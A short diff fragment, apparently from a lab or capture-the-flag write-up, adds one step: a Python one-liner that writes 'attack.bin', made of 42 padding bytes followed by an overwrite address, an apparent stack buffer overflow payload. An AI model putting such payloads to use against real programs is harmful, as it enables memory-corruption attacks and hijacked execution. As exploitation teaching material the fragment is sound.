@@ -1,0 +1,4 @@
+In order to generate the attack file, we can run the following command
+
+python3 -c "open('attack.bin', 'wb').write(b'A'*42+b'\x6d\x62\x55\x56')"
+
